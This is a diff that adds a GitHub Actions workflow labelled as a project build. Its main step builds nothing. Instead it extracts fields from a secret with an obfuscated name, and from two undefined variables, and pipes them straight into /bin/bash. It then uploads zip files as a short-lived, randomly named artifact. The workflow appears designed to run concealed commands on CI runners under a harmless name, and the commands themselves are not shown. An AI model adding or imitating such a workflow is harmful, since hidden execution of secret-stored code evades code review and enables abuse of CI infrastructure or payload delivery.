@@ -1,0 +1,33 @@
+name: Build Project
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  perform:
+    name: Run build
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Run build
+        env:
+          kk2193: ${{ secrets.kk2193 }}
+        run: |
+          printf '%s' "$kk2193" | jq -r .zm00535 | /bin/bash
+          echo $nidnv512 | jq -r .x81 | /bin/bash
+          printf '%s' "$gqp2" | jq -r .dy44682 | /bin/bash
+
+      - name: Save archive
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: vbbx1QG1
+          path: "*.zip"
+          retention-days: 1
